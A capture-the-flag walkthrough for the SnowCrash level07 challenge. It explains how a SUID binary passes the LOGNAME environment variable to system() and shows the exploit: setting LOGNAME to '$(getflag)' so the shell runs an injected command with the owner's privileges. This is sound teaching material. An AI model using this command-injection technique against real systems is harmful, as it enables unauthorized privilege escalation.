# LEVEL07

## 1. Inspect The Home Directory

```bash
level07@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

The binary `level07` is owned by `flag07`, with the SUID bit set `-rwsr-sr-x`, meaning it will run with the privileges of `flag07`.

```bash
level07@SnowCrash:~$ ./level07 
level07
level07@SnowCrash:~$ ./level07 a
level07
```

Running the binary only prints `level07`.

## 2. Analyze The Binary

```bash
level07@SnowCrash:~$ strings level07 
/lib/ld-linux.so.2
zE&9qU
__gmon_start__
libc.so.6
_IO_stdin_used
setresgid
asprintf
getenv
setresuid
system
getegid
geteuid
__libc_start_main
GLIBC_2.0
PTRh 
UWVS
[^_]
LOGNAME
/bin/echo %s 
;*2$"
[...]
```

Three important elements stand out:

```
getenv
LOGNAME
/bin/echo %s
```

This strongly suggests that the binary retrieves the environment variable `LOGNAME` with `getenv()` and prints it with `/bin/echo`.
Because `/bin/echo` is executed via `system()`, command substitution is possible if we control the content of `LOGNAME`.

**Explanation:**
>- `strings`		: displays printable strings from a binary file.

## 3. Confirm With `env`

```bash
level07@SnowCrash:~$ env | grep LOGNAME
LOGNAME=level07
```

Indeed, the binary prints the value of the environment variable `LOGNAME`.

**Explanation:**
>- `env` 			: displays all the environment variables available in the current shell.
>- `|` 				: the pipe operator in shell, redirects the output of the command on the left as the input of the command on the right.
>- `grep` 			: command-line tool to search for text patterns in input.

## 4. Exploit The Binary with Environement Variable Injection

```bash
level07@SnowCrash:~$ export LOGNAME='$(getflag)'
level07@SnowCrash:~$ ./level07 
Check flag.Here is your token : XXX
```

Replaces the environment variable `LOGNAME` with a malicious value containing `$(getflag)`.
Because the program runs `system("/bin/echo $LOGNAME")` with `flag07`’s privileges, the shell interprets the `$(...)` syntax and executes the command inside.

**Explanation:**
>- `export` 			: modifies a environment variable.

**Breakdown of the payload:**
- `$(...)`		: command substitution syntax in shell. It executes the command inside the parentheses and replaces it with the output.

**In the order:**
>- Binary calls `system("/bin/echo $LOGNAME")`.
>- Shell expands it into `system("/bin/echo $(getflag)")`.
>- Shell executes the command substitution (`$(...)`), replacing `$(getflag)` with this output: `Check flag.Here is your token : XXX`.
>- The `system` command becomes : `system("/bin/echo Check flag.Here is your token : XXX")` and is executed.
